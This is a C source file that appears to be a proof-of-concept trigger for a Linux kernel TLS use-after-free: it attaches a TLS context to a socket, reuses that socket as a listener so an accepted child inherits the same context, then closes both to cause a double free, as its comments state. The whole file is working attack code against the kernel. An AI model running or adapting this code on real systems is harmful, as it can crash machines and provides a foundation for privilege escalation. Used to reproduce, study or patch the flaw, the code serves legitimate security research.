#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <linux/tls.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netinet/tcp.h>
#include <arpa/inet.h>
#include <sys/wait.h>
#include <errno.h>

int tls_p, tls_c, peer;

int malloc_tls(int port) 
{
    struct sockaddr_in addr;
    socklen_t len = sizeof(addr);
    int server, client;

    client = socket(AF_INET, SOCK_STREAM, 0); 
    server = socket(AF_INET, SOCK_STREAM, 0); 

    addr.sin_family = AF_INET;
    addr.sin_addr.s_addr = INADDR_ANY;
    addr.sin_port = htons(port);

    bind(server, &addr, sizeof(addr));
    listen(server, 0);

    connect(client, &addr, sizeof(addr));

    accept(server, &addr, &len);

    // Install TLS context
    setsockopt(client, SOL_TCP, TCP_ULP, "tls", sizeof("tls"));

    return client;
}

int copy_tls(int sk, int port) 
{
    struct sockaddr_in addr;
    socklen_t len = sizeof(addr);
    int client, server;

    client = socket(AF_INET, SOCK_STREAM, 0);

    addr.sin_family = AF_UNSPEC;
    addr.sin_addr.s_addr = INADDR_ANY;
    addr.sin_port = htons(port);
    connect(sk, &addr, sizeof(addr));

    addr.sin_family = AF_INET;
    bind(sk, &addr, sizeof(addr));
    listen(sk, 0);

	// Copy the 'icsk_ulp_data (tls_context)'
    connect(client, &addr, sizeof(addr)); 

    server = accept(sk, &addr, &len);
    peer = client;

    return server;
}

void main()
{
    char buf[32];

    tls_p = malloc_tls(1234);
    tls_c = copy_tls(tls_p, 5678);

    close(tls_p);

    /* 
	 * Wait for RCU grace period
     * After KFREE_DRAIN_JIFFIES (5 * HZ(1000))
	 * All objects in 'records[]' are freed
     */
    sleep(6);

    send(tls_c, "HELLO", 5, 0);
    recv(peer, buf, sizeof(buf), 0); 
    printf("peer received: %.*s\n", 5, buf);

    send(peer, "WORLD", 5, 0);
    recv(tls_c, buf, sizeof(buf), 0);
    printf("tls_c received: %.*s\n", 5, buf);

    // tls_context is freed again (KASAN: double-free)
    close(tls_c);
}
